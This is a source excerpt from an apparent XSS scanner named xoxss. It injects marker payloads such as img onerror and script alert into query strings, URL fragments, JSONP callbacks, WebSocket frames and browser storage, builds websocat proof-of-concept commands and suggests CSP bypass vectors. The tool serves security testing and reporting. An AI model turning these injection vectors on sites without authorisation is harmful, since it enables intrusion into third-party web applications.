                            f"WebSocket probe failed for {truncate(endpoint, 120)}: {hit.error}"
                        )
                    continue
                poc_command = (
                    f"printf '%s' {shlex.quote(hit.payload)} | "
                    f"websocat -1 {shlex.quote(endpoint)}"
                )
                evidence = (
                    f"{hit.evidence}; response frame: "
                    f"{truncate(hit.response or '', 240)}"
                )
                self.websocket_findings.append({
                    "url": endpoint,
                    "sink": "frame-reflection",
                    "location": page_url[:500],
                    "description": evidence[:500],
                    "payload": hit.payload,
                })
                self.add_finding(
                    Finding(
                        kind="WebSocket frame reflection",
                        url=page_url,
                        parameter="websocket-frame",
                        method="WS",
                        payload=hit.payload,
                        evidence=evidence,
                        confidence="medium" if hit.executable else "low",
                        context=hit.context,
                        detail=(
                            "The endpoint echoed the injected frame. Browser execution depends "
                            "on the page's message handler and sink; verify manually."
                        ),
                        poc_url=endpoint,
                        poc_command=poc_command,
                        source="websocket",
                        sink="frame-reflection",
                    )
                )
                return

    # -- DOM XSS ----------------------------------------------------------------------
    def dom_vectors(self, url: str, limit: int = 16) -> List[Tuple[str, str, str]]:
        vectors: List[Tuple[str, str, str]] = []
        templates = [("<img src=x onerror=\"{m}\">", "html"), ("{m}", "js")]
        params = parse_qsl(urlsplit(url).query, keep_blank_values=True)
        for template, kind in templates:
            for name, _value in params[:8]:
                token = unique_token()
                payload = self.payloads.render(template, token)
                vectors.append((replace_query_param(url, name, payload), token, kind))
            token = unique_token()
            payload = self.payloads.render(template, token)
            parts = urlsplit(url)
            vectors.append((urlunsplit((parts.scheme, parts.netloc, parts.path, parts.query, payload)), token, kind))
        return vectors[:limit]

    async def test_dom(self, url: str) -> None:
        response = await self.http.get(url, cache=True)
        if response.error or not response.text or not HAS_BS4:
            return

        scripts = extract_scripts(url, response.text)
        fetched = 0
        for script in scripts:
            if script.inline or fetched >= 12 or self._stop.is_set():
                continue
            if not self.scope.in_scope(script.url):
                continue
            remote = await self.http.get(script.url, cache=True)
            if remote.ok and remote.text:
                script.content = remote.text
                fetched += 1

        if HAS_RECON and analyze_js_taint is not None:
            for script in scripts:
                if not script.content:
                    continue
                try:
                    flows = analyze_js_taint(script.content, script.url or url)
                except Exception as exc:
                    self.console.debug(f"AST taint analysis failed: {exc}")
                    continue
                self.stats.ast_flows += len(flows)
                for flow in flows:
                    self._record_taint_flow(script.url or url, flow)

        candidates = static_dom_candidates(scripts)
        inline_sink = any(has_dom_sink(script.content) for script in scripts if script.content)

        # --postmessage / --websocket: analyze inline scripts for sink handlers
        if scripts and (self.args.postmessage or self.args.websocket):
            from xoxss.analysis.postmessage import PostMessageAnalyzer
            from xoxss.analysis.websocket import WebSocketAnalyzer
            marker = unique_token()
            for script in scripts:
                if not script.content or self._stop.is_set():
                    continue
                if self.args.postmessage:
                    try:
                        for vuln in PostMessageAnalyzer().analyze_postmessage_handlers(
                            script.content, marker
                        ):
                            self.postmessage_findings.append({
                                'url': script.url or url,
                                'sink': vuln.sink_type.value,
                                'origin_validated': vuln.has_origin_validation,
                                'description': vuln.description,
                            })
                    except Exception as exc:
                        self.console.debug(f"postMessage analysis failed: {exc}")
                if self.args.websocket:
                    try:
                        for vuln in WebSocketAnalyzer().analyze_websocket_handlers(
                            script.content, marker
                        ):
                            self.websocket_findings.append({
                                'url': script.url or url,
                                'sink': vuln.sink_type.value,
                                'location': vuln.location[:160],
                                'description': vuln.description,
                            })
                    except Exception as exc:
                        self.console.debug(f"WebSocket analysis failed: {exc}")
            if self.postmessage_findings or self.websocket_findings:
                self.console.debug(
                    f"postMessage/WebSocket sinks on {url}: "
                    f"{len(self.postmessage_findings)} pm, {len(self.websocket_findings)} ws"
                )
            if self.args.websocket and getattr(self.args, "ws_active", False):
                await self._probe_websocket_frames(url, scripts)

        # --dom-clobbering: static check on the page markup
        if self.args.dom_clobbering and response.text:
            from xoxss.analysis.dom_clobbering import DOMClobberingDetector
            try:
                for vuln in DOMClobberingDetector().detect_dom_clobbering(response.text, url):
                    self.dom_clobber_findings.append({
                        'url': url,
                        'type': vuln.clobbering_type.value,
                        'property': vuln.target_property,
                        'element': vuln.element[:120],
                        'severity': vuln.severity,
                    })
                    self.console.warn(
                        f"DOM clobbering ({vuln.clobbering_type.value}): "
                        f"{vuln.target_property} @ {truncate(url, 90)}"
                    )
            except Exception as exc:
                self.console.debug(f"DOM clobbering analysis failed: {exc}")

        # --file-upload: look for upload forms so the operator gets an endpoint list
        if self.args.file_upload and response.text:
            from xoxss.analysis.file_upload import FileUploadAnalyzer
            try:
                if FileUploadAnalyzer().detect_file_upload_endpoint(response.text):
                    self.file_upload_findings.append({'url': url})
                    self.console.info(f"File upload form found: {url}", important=False)
            except Exception as exc:
                self.console.debug(f"File upload analysis failed: {exc}")

        if candidates:
            self.console.debug(
                f"DOM source/sink candidates on {url}: "
                + "; ".join(f"{c['source']} -> {c['sink']}" for c in candidates[:4])
            )
            if self.args.report_reflections:
                for candidate in candidates[:3]:
                    self.add_finding(
                        Finding(
                            kind="DOM XSS (static candidate)",
                            url=url,
                            parameter="N/A",
                            method="GET",
                            payload=candidate.get("snippet", ""),
                            evidence=f"{candidate['source']} flows into {candidate['sink']}",
                            confidence="low",
                            context="dom",
                            detail=f"script: {candidate.get('script', '')}",
                            source="dom",
                            sink=candidate.get("sink", "") or "",
                            confidence_rationale=(
                                "A static source/sink pair exists in page scripts; no runtime "
                                "execution was observed."
                            ),
                        )
                    )

        if not candidates and not inline_sink:
            return
        if self.pool is None or not self.pool.engines:
            if candidates:
                self.console.info(f"DOM sinks present on {url} - install Selenium to verify at runtime", important=False)
            return

        for vector, token, kind in self.dom_vectors(url)[: self.args.max_payloads * 3]:
            if self._stop.is_set():
                return
            try:
                async with self.pool.borrow() as browser:
                    self.stats.browser_checks += 1
                    await browser.navigate(vector)
                    hit = await browser.check_token(token, timeout=2.0)
                    if not hit:
                        continue
                    executed = hit.get("executed") == "yes"
                    # Browser-confirmed execution always carries a screenshot.
                    screenshot = ""
                    if executed or self.args.screenshot:
                        screenshot = await browser.screenshot(
                            str(self.screenshot_dir / f"dom-{token}.png")
                        )
                    sink = str(hit.get("sink") or "")
                    dom_path = str(hit.get("dom_path") or "")
                    self.add_finding(
                        Finding(
                            kind="DOM XSS (runtime sink)" if executed else "DOM XSS (sink taint)",
                            url=vector,
                            parameter="fragment" if kind == "js" else "query/fragment",
                            method="GET",
                            payload=payload_for_kind(kind),
                            evidence=(
                                (f"sink={sink}" + (f" at {dom_path}" if dom_path else "") + "; ")
                                if sink else ""
                            ) + hit.get("evidence", ""),
                            confidence="confirmed" if executed else "low",
                            confidence_rationale=(
                                "Attacker-controlled data reached an instrumented execution sink "
                                "in a real browser."
                                if executed
                                else "Attacker-controlled data reached a DOM sink, but the "
                                "instrumented sink did not confirm execution."
                            ),
                            context=f"dom/{kind}",
                            detail=(
                                f"Executed via {sink}" if executed and sink else
                                (
                                    "Attacker-controlled data reached an instrumented DOM sink and executed"
                                    if executed
                                    else "Attacker-controlled data reached a DOM sink; execution not confirmed"
                                )
                            ),
                            screenshot=screenshot,
                            poc_url=vector,
                            source="dom",
                            sink=sink,
                            dom_path=dom_path,
                        )
                    )
                    return
            except Exception as exc:
                self.console.debug(f"DOM verification error: {exc}")
                return

        # Exercise non-URL sources that static analysis commonly sees in SPAs.
        # These probes use unique per-run keys and stay within the existing
        # browser-worker and same-origin scope controls.
        if not getattr(self.args, "dom_source_probes", False):
            return
        marker = unique_token()
        runtime_value = self.payloads.render('<img src=x onerror="{m}">', marker)
        source_probes = (
            ("localStorage", "(v) => { localStorage.setItem('xss', v); }", True),
            ("sessionStorage", "(v) => { sessionStorage.setItem('xss', v); }", True),
            ("window.name", "(v) => { window.name = v; }", True),
            ("postMessage", "(v) => { window.postMessage(v, '*'); }", False),
        )
        for source_name, seed_script, reload_page in source_probes:
            if self._stop.is_set():
                return
            try:
                async with self.pool.borrow() as browser:
                    await browser.navigate(url)
                    await browser.evaluate(seed_script, runtime_value)
                    if reload_page:
                        await browser.navigate(url)
                    hit = await browser.check_token(marker, timeout=1.0)
                    if not hit:
                        continue
                    executed = hit.get("executed") == "yes"
                    screenshot = ""
                    if executed or self.args.screenshot:
                        screenshot = await browser.screenshot(
                            str(self.screenshot_dir / f"dom-{source_name}-{marker}.png")
                        )
                    sink = str(hit.get("sink") or "")
                    dom_path = str(hit.get("dom_path") or "")
                    self.add_finding(
                        Finding(
                            kind="DOM XSS (runtime sink)" if executed else "DOM XSS (sink taint)",
                            url=url,
                            parameter=source_name,
                            method="BROWSER",
                            payload=runtime_value,
                            evidence=(
                                (f"sink={sink}" + (f" at {dom_path}" if dom_path else "") + "; ")
                                if sink else ""
                            ) + hit.get("evidence", ""),
                            confidence="confirmed" if executed else "low",
                            confidence_rationale=(
                                f"A payload seeded through {source_name} reached an instrumented "
                                "execution sink in a real browser."
                                if executed
                                else f"A payload seeded through {source_name} reached a DOM sink "
                                "but execution was not confirmed."
                            ),
                            context="dom/runtime-source",
                            detail=f"Payload seeded through {source_name} reached an instrumented sink",
                            screenshot=screenshot,
                            poc_url=url,
                            source="dom",
                            sink=sink,
                            dom_path=dom_path,
                        )
                    )
                    return
            except Exception as exc:
                self.console.debug(f"DOM {source_name} source verification error: {exc}")

    async def test_fragment(self, url: str) -> None:
        """Browser-only fragment/hash injection phase.

        URL fragments never reach the server, so this phase is meaningful only
        with a real browser.  A finding is raised only when the marker reaches
        an instrumented execution sink.
        """
        if self.pool is None or not self.pool.engines:
            self.console.debug("Fragment XSS needs a browser; skipping")
            return
        templates = self.payloads.payloads_for("html", 8)
        if not templates:
            return
        self.console.info(f"Testing fragment/hash vectors on {truncate(url, 110)}")
        base = url.split("#", 1)[0]
        for template in templates:
            if self._stop.is_set():
                return
            token = unique_token("f", 9)
            payload = self.payloads.render(template, token, "html")
            target = f"{base}#{payload.replace(' ', '%20')}"
            try:
                async with self.pool.borrow() as browser:
                    await browser.navigate(target)
                    hit = await browser.check_token(token, timeout=2.5)
                    self.stats.browser_checks += 1
                    if not hit or hit.get("executed") != "yes":
                        continue
                    screenshot_path = self.screenshot_dir / f"{token}.png"
                    screenshot = await browser.screenshot(str(screenshot_path))
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                self.console.debug(f"Fragment probe failed: {str(exc)[:160]}")
                continue
            evidence = str(hit.get("evidence") or "")
            sink = str(hit.get("sink") or "")
            if sink:
                evidence = f"sink={sink}; {evidence}" if evidence else f"sink={sink}"
            self.add_finding(
                Finding(
                    kind="DOM XSS (fragment)",
                    url=target,
                    parameter="#hash",
                    method="GET",
                    payload=payload,
                    evidence=evidence,
                    confidence="confirmed",
                    confidence_rationale=(
                        "The fragment marker reached an instrumented execution sink "
                        "in a real browser."
                    ),
                    context="fragment",
                    detail=(
                        "URL fragment executed in the browser; fragments never reach "
                        "the server"
                    ),
                    screenshot=screenshot,
                    poc_url=target,
                    source="fragment",
                    sink=sink,
                    dom_path=str(hit.get("dom_path") or ""),
                )
            )
            return

    # -- stored XSS -------------------------------------------------------------------
    # -- Advanced feature methods (Phase 1 & 2) ----------------------------------------
    async def _test_jsonp(self, url: str) -> None:
        """Test URL for JSONP XSS vulnerabilities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.jsonp import JSONPAnalyzer as JSONPDetector
        
        detector = JSONPDetector()
        response = await self.http.get(url, cache=True)
        if response.error or not response.text:
            return

        endpoints = detector.discover_jsonp_endpoints(url, response.text, response.header("content-type", ""))
        for endpoint in endpoints:
            self.console.debug(f"JSONP endpoint found: {endpoint.url}")
            if not endpoint.callback_param or endpoint.callback_param == "inferred":
                continue  # cannot inject into an inferred callback name

            # Active same-origin test: replace the callback parameter with a
            # script payload and check whether it is reflected unescaped.
            marker = unique_token()
            payload = f"<script>alert('{marker}')</script>"
            try:
                parts = urlsplit(endpoint.url)
                query = parse_qsl(parts.query, keep_blank_values=True)
            except ValueError:
                continue
            query = [(k, payload if k == endpoint.callback_param else v) for k, v in query]
            if not any(k == endpoint.callback_param for k, _ in query):
                query.append((endpoint.callback_param, payload))
            test_url = urlunsplit(parts._replace(query=urlencode(query)))

            result = await self.http.get(test_url)
            if result.error or not result.text:
                continue
            # Strict evidence policy: the callback must be injected into an
            # actual JavaScript response (a real JSONP endpoint), never into an
            # HTML page that merely echoes the query string back.
            content_type = (result.header("content-type", "") or "").lower()
            if "javascript" not in content_type:
                self.console.debug(
                    f"JSONP candidate {endpoint.url} reflected into non-JS content-type "
                    f"({content_type or 'none'}); skipping"
                )
                continue
            # Raw payload present (not HTML-escaped and not URL-encoded)
            if payload in result.text and "&lt;" not in result.text[: result.text.find(payload) + len(payload) + 64]:
                self.jsonp_findings.append({
                    'url': endpoint.url,
                    'callback_param': endpoint.callback_param,
                    'evidence': f"callback parameter reflected unescaped with {payload[:48]}",
                    'poc_url': test_url,
                })
                self.console.warn(f"JSONP XSS found: {endpoint.url} - {endpoint.callback_param}")
    
    async def _analyze_csp(self, url: str) -> None:
        """Analyze CSP headers for bypass opportunities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.csp import CSPAnalyzer
        
        analyzer = CSPAnalyzer()
        response = await self.http.get(url, cache=True)
        if response.error:
            return
        
        # Extract CSP header
        csp_header = response.header("content-security-policy", "")
        if not csp_header:
            return
        
        analysis = analyzer.analyze_csp(csp_header)
        if analysis.bypass_possible:
            self.csp_issues.append({
                'url': url,
                'csp': csp_header,
                'issues': [f"{i.issue_type}: {i.description}" for i in analysis.issues],
            })
            self.console.warn(f"CSP bypass possible: {url}")
            
            # Suggest bypass payloads
            marker = unique_token()
            bypasses = analyzer.suggest_bypass_payloads(analysis, marker)
            for bypass in bypasses:
                self.console.debug(f"CSP bypass suggestion: {bypass[:60]}...")

            try:
                from xoxss.analysis.csp_bypass import CSPBypassAutomator

                automator = CSPBypassAutomator()
                parsed_policy = automator.parse_csp(csp_header)
                applicable = automator.get_applicable_bypasses(parsed_policy, marker)
                extra_payloads = automator.generate_bypass_payloads(applicable, marker)
                for bp in extra_payloads:
                    self.console.debug(f"Automated CSP vector: {bp[:60]}...")
            except Exception:
                pass

        # Trusted Types directive audit (--trusted-types)
        if getattr(self.args, "trusted_types", False):
            from xoxss.analysis.trusted_types import TrustedTypesAnalyzer
            tt_analysis = TrustedTypesAnalyzer().analyze_trusted_types(csp_header)
            if tt_analysis.issues:
                self.trusted_types_issues.append({
                    'url': url,
                    'issues': [
                        f"{issue.issue_type} ({issue.severity}): {issue.description}"
                        for issue in tt_analysis.issues
                    ],
                })
                self.console.debug(f"Trusted Types audit: {len(tt_analysis.issues)} issue(s) on {url}")

    def _analyze_graphql(self, url: str, body: str, content_type: str) -> None:
        """Detect GraphQL endpoints and flag open introspection (--graphql)."""
        if not HAS_ADVANCED or not getattr(self.args, "graphql", False):
            return
        path = urlsplit(url).path.rstrip("/").lower()
        if ("application/json" not in content_type
                and not path.endswith(("graphql", "graphiql", "api/graphql"))):
            return
        from xoxss.analysis.graphql import GraphQLAnalyzer

        analyzer = GraphQLAnalyzer()
        try:
            if not analyzer.detect_graphql_endpoint(url, body):
                return
        except Exception as exc:
            self.console.debug(f"GraphQL detection failed for {url}: {exc}")
            return
        if any(item.get("url") == url for item in self.graphql_endpoints):
            return
        introspection_open = False
        try:
            introspection_open = analyzer.check_introspection(body)
        except Exception:
            pass
        self.graphql_endpoints.append({
            'url': url,
            'introspection': introspection_open,
        })
        if introspection_open:
            self.console.warn(f"GraphQL introspection enabled: {url}")
        else:
            self.console.info(f"GraphQL endpoint found: {url}", important=False)
    
    async def _analyze_cors(self, url: str) -> None:
        """Analyze CORS headers for misconfigurations."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.cors import CORSAnalyzer
        
        analyzer = CORSAnalyzer()
        response = await self.http.get(url, cache=True)
        if response.error:
            return
        
        # Extract CORS headers
        cors_headers = {}
        for header, value in response.headers.items():
            if 'access-control' in header.lower():
                cors_headers[header] = value
        
        if not cors_headers:
            return
        
        analysis = analyzer.analyze_cors(cors_headers)
        if analysis.is_misconfigured:
            self.cors_issues.append({
                'url': url,
                'issues': [f"{i.issue_type}: {i.description}" for i in analysis.issues],
            })
            self.console.warn(f"CORS misconfiguration: {url}")
            
            # Check XSS exfiltration risk
            if analyzer.check_xss_data_exfiltration_risk(analysis):
                self.console.warn("  XSS data exfiltration possible via CORS")
    
    async def _detect_mxss(self, url: str, js_content: str) -> None:
        """Detect mutation XSS vulnerabilities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.mxss import MXSSDetector
        
        detector = MXSSDetector()
        analysis = detector.detect_mutation_xss(js_content, url)
        
        if analysis.has_mutation_xss:
            self.mxss_findings.append({
                'url': url,
                'sanitizer': analysis.sanitizer or 'unknown',
                'version': analysis.version or 'unknown',
                'vulnerable': analysis.vulnerable,
                'contexts': analysis.contexts,
            })
            self.console.warn(f"Mutation XSS possible: {url} - {analysis.sanitizer} {analysis.version}")
            
            # Generate test payloads
            marker = unique_token()
            payloads = detector.generate_test_payloads(analysis, marker)
            for payload in payloads[:3]:
                self.console.debug(f"mXSS test payload: {payload[:80]}...")
    
    async def _detect_proto_pollution(self, url: str, js_content: str) -> None:
        """Detect prototype pollution vulnerabilities."""
        if not HAS_ADVANCED:
            return
        
        from xoxss.analysis.proto_pollution import PrototypePollutionDetector
        
        detector = PrototypePollutionDetector()
        analysis = detector.detect_prototype_pollution(js_content, url)
        
        if analysis.has_pollution_sources:
            if not any(item.get("url") == url for item in self.proto_pollution_findings):
                self.proto_pollution_findings.append({
                    'url': url,
                    'frameworks': analysis.frameworks,
                    'pollution_sources': [source.value for source in analysis.pollution_sources],
                    'has_gadget_chains': analysis.has_gadget_chains,
                })
                self.console.warn(f"Prototype pollution sources found: {url}")
            self.console.debug(
                "Proto hints: "
                + ", ".join(source.value for source in analysis.pollution_sources)
                + " | frameworks: "
                + (", ".join(analysis.frameworks) or "none")
            )
    
    # -- stored XSS -------------------------------------------------------------------
    async def check_stored(self, point: InjectionPoint, token: str, payload: str) -> Optional[str]:
        if not self.args.stored:
            return None
        candidates: List[str] = []
        if point.page_url:
            candidates.append(point.page_url)
        candidates.extend(self.state.extra.get("discovered", [])[: self.args.stored_pages])
        candidates.extend(sorted(self.state.scanned)[: self.args.stored_pages])
        seen: Set[str] = set()
        for page in candidates[: self.args.stored_pages]:
            normalized = normalize_url(page)
            if normalized in seen:
                continue
            seen.add(normalized)
            response = await self.http.get(page, cache=False)
            if response.error or not response.text:
                continue
            if token in response.text or payload in response.text:
                self._stored_hit_response = response
                return page
        return None

    # -- summary ----------------------------------------------------------------------
    def _print_briefing(self) -> bool:
        """Render the operation briefing; returns False when output is plain."""
        if self.console.quiet or _ui is None or not _ui.enabled():
            return False
        rows = briefing_rows(self.args, self.target)
        if not rows:
            return False
        label_width = max(len(label) for label, _ in rows)
        body = [
            _ui.paint(label.ljust(label_width), _ui.BRAND, _ui.BOLD) + "  " + value
            for label, value in rows
        ]
        width = min(96, max(64, self.console._width() - 6))
        self.console.raw("")
        self.console.raw(_ui.panel("operation briefing", body, width=width))
        self.console.raw("")
        return True

    def print_summary(self) -> None:
        if self.console.quiet:
            return
        stats = self.stats
        console = self.console
        console.raw("")
        console.rule("scan summary")
        console.raw("")

        confidence_counts = Counter(
            finding.confidence or "low" for finding in self.findings
        )
        total = len(self.findings)
        tally = " / ".join(
            f"{confidence_counts[level]} {level}"
            for level in CONFIDENCE_LEVELS
            if confidence_counts[level]
        )
        finding_style = f"{bcolors.FAIL}{bcolors.BOLD}" if total else bcolors.GREY
        header = [
            ("TARGET", self.target, ""),
            ("DURATION", fmt_duration(stats.elapsed), ""),
            (
                "FINDINGS",
                f"{total}" + (f"  [{tally}]" if tally else ""),
                finding_style,
            ),
        ]
        header_width = max(len(label) for label, _, _ in header)
        for label, value, style in header:
            reset = bcolors.ENDC if style else ""
            console.raw(
                f"  {bcolors.DIM}{label.rjust(header_width)}{bcolors.ENDC}  "
                f"{style}{value}{reset}"
            )
        console.raw("")

        rows = [
            ("URLs scanned", f"{stats.urls_done}/{stats.urls_total}"),
            ("Endpoints", str(len(self.endpoints))),
            ("Subdomains", str(stats.subdomains)),
            ("Passive URLs", str(stats.passive_urls)),
            ("JS files / secrets", f"{stats.js_files} / {stats.secrets}"),
            ("AST taint flows", str(stats.ast_flows)),
            ("OOB markers / hits", f"{stats.oob_registered} / {stats.oob_hits}"),
            ("External findings", str(stats.external_findings)),
            ("Injection points", str(stats.points)),
            ("Payloads sent", str(stats.payloads)),
            ("HTTP requests", str(stats.requests)),
            ("HTTP errors", str(stats.errors)),
            ("Truncated responses", str(stats.truncated_responses)),
            ("Browser checks", str(stats.browser_checks)),
            ("WAF", self.waf.label()),
            ("Vulnerable libs", str(len(self.vulnerable_libs))),
            ("JSONP findings", str(len(self.jsonp_findings))),
            ("CSP issues", str(len(self.csp_issues))),
            ("CORS issues", str(len(self.cors_issues))),
            ("Trusted Types issues", str(len(self.trusted_types_issues))),
            ("DOM clobbering", str(len(self.dom_clobber_findings))),
            ("postMessage sinks", str(len(self.postmessage_findings))),
            ("WebSocket sinks", str(len(self.websocket_findings))),
            ("File upload forms", str(len(self.file_upload_findings))),
            ("GraphQL endpoints", str(len(self.graphql_endpoints))),
            ("State file", str(self.state.path) if self.state.enabled else "disabled"),
        ]
        label_width = max(len(label) for label, _ in rows)
        waf_label = self.waf.label().strip().lower()
        waf_clear = waf_label in ("", "none", "none detected", "not detected")

        def value_style(label: str, value: str) -> str:
            if label == "WAF" and not waf_clear:
                return bcolors.WARNING
            if label in ("HTTP errors", "Truncated responses") and value not in ("0", ""):
                return bcolors.WARNING
            if (
                label in ("Vulnerable libs", "External findings", "JSONP findings")
                and value not in ("0", "")
            ):
                return bcolors.WARNING
            if label == "State file" and value == "disabled":
                return bcolors.GREY
            return ""

        def render_row(label: str, value: str) -> str:
            style = value_style(label, value)
            reset = bcolors.ENDC if style else ""
            return (
                f"  {bcolors.DIM}{label.rjust(label_width)}{bcolors.ENDC}  "
                f"{style}{value}{reset}"
            )

        rendered = [render_row(label, value) for label, value in rows]
        visible = [strip_ansi(item) for item in rendered]
        half = (len(rendered) + 1) // 2
        left, right = rendered[:half], rendered[half:]
        left_visible, right_visible = visible[:half], visible[half:]
        column_width = max((len(item) for item in left_visible), default=0) + 4
        right_width = max((len(item) for item in right_visible), default=0)
        if console._width() >= column_width + right_width + 2:
            for index, row in enumerate(left):
                gap = " " * max(1, column_width - len(left_visible[index]))
                other = right[index] if index < len(right) else ""
                console.raw(row + gap + other)
        else:
            for row in rendered:
                console.raw(row)

        console.raw("")
        glyph = _ui.glyphs()["tick"] if _ui is not None else "ok"
        if total:
            console.raw(
                f"  {bcolors.FAIL}{bcolors.BOLD}{glyph} {total} evidence-backed "
                f"finding(s){bcolors.ENDC}  "
                f"{bcolors.DIM}replay: xoxss --replay <finding-id>{bcolors.ENDC}"
            )
        else:
            console.raw(
                f"  {bcolors.OKGREEN}{glyph} no findings in this pass{bcolors.ENDC}"
            )
            console.raw(
                f"  {bcolors.GREY}add --blind/--interactsh for out-of-band coverage; "
                f"--report-reflections surfaces inert leads{bcolors.ENDC}"
            )

        if self.findings:
            console.raw("")
            console.raw(f"{bcolors.BOLD}XSS findings{bcolors.ENDC}")
            ordered = {"confirmed": 0, "high": 1, "medium": 2, "low": 3}
            for finding in sorted(
                self.findings, key=lambda item: ordered.get(item.confidence, 9)
            ):
                colour = {
                    "confirmed": bcolors.FAIL,
                    "high": bcolors.OKGREEN,
                    "medium": bcolors.WARNING,
                    "low": bcolors.GREY,
                }.get(finding.confidence, bcolors.ENDC)
                console.raw(
                    f"  {colour}[{finding.confidence.upper()}]{bcolors.ENDC} "
                    f"{finding.kind} - {finding.parameter} ({finding.method})"
                )
                console.raw(
                    f"      {truncate(finding.url, 150)}  "
                    f"{bcolors.DIM}id={finding.finding_id}{bcolors.ENDC}"
                )

        if self.vulnerable_libs:
            console.raw("")
            console.raw(f"{bcolors.BOLD}Vulnerable JavaScript libraries{bcolors.ENDC}")
            for vuln in self.vulnerable_libs:
                colour = {
                    "high": bcolors.FAIL,
                    "medium": bcolors.WARNING,
                    "low": bcolors.GREY,
                }.get(vuln.severity, bcolors.ENDC)
                console.raw(
                    f"  {colour}[{vuln.severity}]{bcolors.ENDC} "
                    f"{vuln.name} {vuln.version} - {vuln.cve}"
                )
                console.raw(f"      {truncate(vuln.url, 160)}")

        if self.jsonp_findings:
            console.raw("")
            console.raw(f"{bcolors.BOLD}JSONP XSS findings{bcolors.ENDC}")
            for finding in self.jsonp_findings[:5]:
                console.raw(f"  URL: {truncate(finding['url'], 120)}")
                console.raw(f"  Callback: {finding['callback_param']}")

        if self.csp_issues:
            console.raw("")
            console.raw(f"{bcolors.BOLD}CSP bypass opportunities{bcolors.ENDC}")
            for issue in self.csp_issues[:5]:
                console.raw(f"  URL: {truncate(issue['url'], 120)}")
                for sub_issue in issue["issues"][:2]:
                    console.raw(f"    - {sub_issue}")

        if self.cors_issues:
            console.raw("")
            console.raw(f"{bcolors.BOLD}CORS misconfigurations{bcolors.ENDC}")
            for issue in self.cors_issues[:5]:
                console.raw(f"  URL: {truncate(issue['url'], 120)}")
                for sub_issue in issue["issues"][:2]:
                    console.raw(f"    - {sub_issue}")

        if self.trusted_types_issues:
            console.raw("")
            console.raw(f"{bcolors.BOLD}Trusted Types issues{bcolors.ENDC}")
            for item in self.trusted_types_issues[:5]:
                console.raw(f"  URL: {truncate(item['url'], 120)}")
                for sub_issue in item["issues"][:2]:
                    console.raw(f"    - {sub_issue}")

        if self.dom_clobber_findings:
            console.raw("")
            console.raw(f"{bcolors.BOLD}DOM clobbering{bcolors.ENDC}")
            for item in self.dom_clobber_findings[:5]:
                console.raw(
                    f"  [{item['severity']}] {item['type']} "
                    f"-> {item['property']}  ({truncate(item['url'], 110)})"
                )

        if self.postmessage_findings:
            console.raw("")
            console.raw(f"{bcolors.BOLD}postMessage sinks{bcolors.ENDC}")
            for item in self.postmessage_findings[:5]:
                validated = (
                    "origin validated" if item["origin_validated"] else "NO origin check"
                )
                console.raw(
                    f"  {item['sink']} ({validated}) - {truncate(item['url'], 110)}"
                )

        if self.websocket_findings:
            console.raw("")
            console.raw(f"{bcolors.BOLD}WebSocket sinks{bcolors.ENDC}")
            for item in self.websocket_findings[:5]:
                console.raw(f"  {item['sink']} - {truncate(item['url'], 110)}")
                console.raw(f"      {truncate(item['location'], 140)}")

        if self.file_upload_findings:
            console.raw("")
            console.raw(f"{bcolors.BOLD}File upload forms{bcolors.ENDC}")
            for item in self.file_upload_findings[:5]:
                console.raw(f"  {truncate(item['url'], 120)}")

        if self.graphql_endpoints:
            console.raw("")
            console.raw(f"{bcolors.BOLD}GraphQL endpoints{bcolors.ENDC}")
            for item in self.graphql_endpoints[:5]:
                flag = (
                    "introspection ENABLED"
                    if item["introspection"]
                    else "introspection off"
                )
                console.raw(f"  {flag} - {truncate(item['url'], 120)}")

    # -- reports ----------------------------------------------------------------------
    def write_reports(self) -> None:
        formats = [item.strip().lower() for item in str(self.args.report).split(",") if item.strip()]
        if "none" in formats or not formats:
            return
        if "all" in formats:
            formats = ["json", "md", "html", "sarif"]
        report_dir = Path(self.args.report_dir)
        try:
            report_dir.mkdir(parents=True, exist_ok=True)
        except OSError as exc:
            self.console.warn(f"Cannot create report directory {report_dir}: {exc}")
            return

        host = slugify(urlsplit(self.target).hostname or "target")
        tag = hashlib.sha1(self.target.encode("utf-8", "replace")).hexdigest()[:6]
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S-%f")
        written: List[str] = []
        for fmt in formats:
            if fmt not in ("json", "md", "html", "sarif"):
                continue
            path = report_dir / f"xoxss-{host}-{tag}-{stamp}.{fmt}"
            try:
                if fmt == "json":
                    write_json_report(path, self)
                elif fmt == "md":
                    write_markdown_report(path, self)
                elif fmt == "sarif":
                    write_sarif_report(path, self)
                else:
                    write_html_report(path, self)
                written.append(str(path))
                latest = report_dir / f"xoxss-{host}-{tag}-latest.{fmt}"
                try:
                    shutil.copyfile(path, latest)
                except OSError:
                    pass
            except Exception as exc:
                self.console.warn(f"Failed to write {fmt} report: {exc}")

        if written:
            self.console.info("Reports: " + ", ".join(written), important=False)

# --------------------------------------------------------------------------------------
# Reports
# --------------------------------------------------------------------------------------


def payload_for_kind(kind: str) -> str:
    if kind == "html":
        return '<img src=x onerror="/* XOX$$ marker */">'
    return "/* XOX$$ JavaScript marker */"


def build_sarif(scanner: XSSScanner) -> Dict[str, Any]:
    """Thin adapter over :func:`xoxss.reports.sarif.build_sarif_document`."""
    return build_sarif_document(
        scanner.findings,
        target=scanner.target,
        waf_names=scanner.waf.names,
        duration_seconds=scanner.stats.elapsed,
        endpoint_count=len(scanner.endpoints),
        truncated_responses=getattr(scanner.stats, "truncated_responses", 0),
        blind_markers=scanner.blind_markers,
        tool_name=APP_NAME,
        tool_version=VERSION,
    )


def write_sarif_report(path: Path, scanner: XSSScanner) -> None:
    path.write_text(json.dumps(build_sarif(scanner), indent=2, ensure_ascii=False), encoding="utf-8")



# --------------------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------------------

# god mode (--god / --yolo)
# --------------------------------------------------------------------------------------

_GOD_BROWSERS: Dict[str, Tuple[Tuple[str, ...], Tuple[str, ...]]] = {
    # kind -> (PATH command names, direct binary locations relative to install dirs)
    "chrome": (
        ("chrome", "chrome.exe", "google-chrome", "google-chrome-stable"),
        (r"Google\Chrome\Application\chrome.exe",),
    ),
    "chromium": (
        ("chromium", "chromium.exe", "chromium-browser"),
        (r"Chromium\Application\chromium.exe",),
    ),
    "edge": (
        ("msedge", "msedge.exe", "microsoft-edge", "microsoft-edge-stable"),
        (r"Microsoft\Edge\Application\msedge.exe",),
    ),
    "firefox": (
